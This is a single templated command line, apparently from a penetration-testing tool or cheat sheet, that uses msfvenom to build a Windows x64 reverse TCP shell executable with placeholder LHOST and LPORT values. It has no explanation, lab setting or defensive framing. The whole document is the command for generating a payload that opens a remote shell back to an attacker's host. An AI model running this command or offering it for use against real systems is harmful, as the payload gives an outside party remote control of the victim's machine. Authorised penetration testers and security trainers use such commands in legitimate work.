msfvenom -p windows/x64/shell_reverse_tcp -f exe -o ./shell.exe LHOST={{ LHOST }} LPORT={{ LPORT }}
